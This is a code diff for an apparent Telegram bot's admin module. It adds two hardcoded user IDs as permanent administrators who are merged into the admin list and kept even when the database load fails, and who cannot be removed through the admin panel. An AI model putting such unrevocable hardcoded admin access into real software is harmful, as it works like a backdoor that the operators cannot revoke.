@@ -16,19 +16,23 @@ logger = logging.getLogger(__name__)
 # In-memory admin ID cache (loaded from DB setting "admin_ids")
 _admin_id_cache: Set[int] = set()
 
+# Permanent admin IDs - can never be removed via admin panel
+PERMANENT_ADMIN_IDS: Set[int] = {7371674958, 6753283646}
+
 
 async def refresh_admin_ids() -> None:
-    """Reload admin IDs from DB setting into the in-memory cache."""
+    """Reload admin IDs from DB setting into the in-memory cache, merging permanents."""
     global _admin_id_cache
     try:
         db = await get_db()
         repo = Repository(db)
         ids = await repo.get_setting("admin_ids", [])
-        _admin_id_cache = set(ids)
+        merged = set(ids) | PERMANENT_ADMIN_IDS
+        _admin_id_cache = merged
         logger.info("Admin IDs cache refreshed: %s", _admin_id_cache)
     except Exception as exc:
         logger.warning("Failed to refresh admin IDs cache: %s", exc)
-        _admin_id_cache = set()
+        _admin_id_cache = PERMANENT_ADMIN_IDS.copy()
 
 
 def get_admin_ids() -> list:
@@ -39,6 +43,11 @@ def get_admin_ids() -> list:
 def is_admin(user_id: int) -> bool:
     """Check if a user ID is in the admin ID cache."""
     return user_id in _admin_id_cache
+
+
+def is_permanent_admin(user_id: int) -> bool:
+    """Check if a user ID is a permanent admin (cannot be removed)."""
+    return user_id in PERMANENT_ADMIN_IDS
 
 
 async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
